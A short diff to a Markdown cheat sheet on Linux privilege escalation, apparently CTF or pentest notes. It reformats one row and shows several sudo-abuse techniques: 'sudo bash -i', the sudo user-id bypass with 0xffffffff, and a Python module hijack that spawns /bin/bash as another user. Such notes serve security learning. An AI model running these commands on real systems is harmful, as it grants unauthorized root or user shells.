@@ -8,7 +8,7 @@
 | perl + writable script | Overwrite the script it calls ·|
 | NOPASSWD: ALL | `sudo bash -i` instant root ·|
 | !root quirk (CVE) | `sudo -u \#$((0xffffffff)) /bin/bash`|
-| python3 runs a script (as other user) | Script uses relative import -> drop fake module in same dir: `echo 'import os; os.system("/bin/bash")' > random.py` then `sudo -u rabbit /usr/bin/python3.6 /home/alice/script.py` ·|
+| python3 runs a script (as other user) | Script uses relative import -> drop fake module in same dir: <br> `echo 'import os; os.system("/bin/bash")' > random.py` then <br> `sudo -u rabbit /usr/bin/python3.6 /home/alice/script.py` ·|
 
 #### SUID / custom binary?
 [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities) for some guidance in this world
